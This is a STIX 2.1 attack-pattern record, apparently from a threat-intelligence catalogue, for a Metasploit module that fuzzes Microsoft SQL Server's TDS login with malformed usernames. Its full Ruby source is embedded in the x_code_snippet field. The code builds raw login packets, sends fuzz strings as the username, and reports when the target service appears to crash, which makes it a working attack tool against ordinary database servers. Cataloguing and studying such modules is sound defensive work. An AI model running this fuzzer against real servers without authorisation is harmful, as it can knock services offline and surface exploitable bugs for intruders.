{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--42e1eaf8-f413-4656-beeb-541adc4d33e4",
    "created": "2024-08-14T16:26:30.966038Z",
    "modified": "2024-08-14T16:26:30.966042Z",
    "name": "TDS Protocol Login Request Username Fuzzer",
    "description": " This module sends a series of malformed TDS login requests. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/fuzzers/tds/tds_login_username.rb",
            "external_id": "tds_login_username.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MSSQL\n  include Msf::Auxiliary::Fuzzer\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'TDS Protocol Login Request Username Fuzzer',\n      'Description'    => %q{\n        This module sends a series of malformed TDS login requests.\n      },\n      'Author'         => [ 'hdm' ],\n      'License'        => MSF_LICENSE\n    ))\n  end\n\n  # A copy of the mssql_login method with the ability to overload each option\n  def do_login(opts={})\n\n    @connected = false\n    disconnect if self.sock\n    connect\n    @connected = true\n\n    pkt = \"\"\n    idx = 0\n    db = \"\"\n\n    pkt << [\n      0x00000000,   # Dummy size\n      opts[:tds_version]    || 0x71000001,   # TDS Version\n      opts[:size]           || 0x00000000,   # Size\n      opts[:version]        || 0x00000007,   # Version\n      opts[:pid]            || rand(1024+1), # PID\n      opts[:connection_id]  || 0x00000000,   # ConnectionID\n      opts[:flags_opt1]     || 0xe0,         # Option Flags 1\n      opts[:flags_opt2]     || 0x03,         # Option Flags 2\n      opts[:flags_sql_type] || 0x00,         # SQL Type Flags\n      opts[:flags_reserved] || 0x00,         # Reserved Flags\n      opts[:timezone]       || 0x00000000,   # Time Zone\n      opts[:collation]      || 0x00000000    # Collation\n    ].pack('VVVVVVCCCCVV')\n\n\n    cname = Rex::Text.to_unicode( opts[:cname] || Rex::Text.rand_text_alpha(rand(8)+1) )\n    uname = Rex::Text.to_unicode( opts[:uname] || \"sa\" )\n    pname = opts[:pname_raw] || mssql_tds_encrypt( opts[:pname] || \"\" )\n    aname = Rex::Text.to_unicode(opts[:aname] || Rex::Text.rand_text_alpha(rand(8)+1) )\n    sname = Rex::Text.to_unicode( opts[:sname] || rhost )\n    dname = Rex::Text.to_unicode( opts[:dname] || db )\n\n    idx = pkt.size + 50 # lengths below\n\n    pkt << [idx, cname.length / 2].pack('vv')\n    idx += cname.length\n\n    pkt << [idx, uname.length / 2].pack('vv')\n    idx += uname.length\n\n    pkt << [idx, pname.length / 2].pack('vv')\n    idx += pname.length\n\n    pkt << [idx, aname.length / 2].pack('vv')\n    idx += aname.length\n\n    pkt << [idx, sname.length / 2].pack('vv')\n    idx += sname.length\n\n    pkt << [0, 0].pack('vv')\n\n    pkt << [idx, aname.length / 2].pack('vv')\n    idx += aname.length\n\n    pkt << [idx, 0].pack('vv')\n\n    pkt << [idx, dname.length / 2].pack('vv')\n    idx += dname.length\n\n    # The total length has to be embedded twice more here\n    pkt << [\n      0,\n      0,\n      0x12345678,\n      0x12345678\n    ].pack('vVVV')\n\n    pkt << cname\n    pkt << uname\n    pkt << pname\n    pkt << aname\n    pkt << sname\n    pkt << aname\n    pkt << dname\n\n    # Total packet length\n    pkt[0,4] = [pkt.length].pack('V')\n\n    # Embedded packet lengths\n    pkt[pkt.index([0x12345678].pack('V')), 8] = [pkt.length].pack('V') * 2\n\n    # Packet header and total length including header\n    pkt = \"\\x10\\x01\" + [pkt.length + 8].pack('n') + [0].pack('n') + [1].pack('C') + \"\\x00\" + pkt\n\n    resp = mssql_send_recv(pkt,opts[:timeout])\n\n    info = {:errors => []}\n    info = mssql_parse_reply(resp,info)\n    info\n  end\n\n  def run\n    last_str = nil\n    last_inp = nil\n    last_err = nil\n\n    cnt = 0\n    fuzz_strings do |str|\n      # capped at 16-bit lengths\n      next if str.length > 65535\n      cnt += 1\n\n      if(cnt % 100 == 0)\n        print_status(\"Fuzzing with iteration #{cnt} using #{@last_fuzzer_input}\")\n      end\n\n      begin\n        do_login(:uname => str, :timeout => 0.50)\n      rescue ::Interrupt\n        print_status(\"Exiting on interrupt: iteration #{cnt} using #{@last_fuzzer_input}\")\n        raise $!\n      rescue ::Exception => e\n        last_err = e\n      ensure\n        disconnect\n      end\n\n      if(not @connected)\n        if(last_str)\n          print_status(\"The service may have crashed: method=#{last_inp} string=#{last_str.unpack(\"H*\")[0]} error=#{last_err}\")\n        else\n          print_status(\"Could not connect to the service: #{last_err}\")\n        end\n        return\n      end\n\n      last_str = str\n      last_inp = @last_fuzzer_input\n    end\n  end\nend\n"
}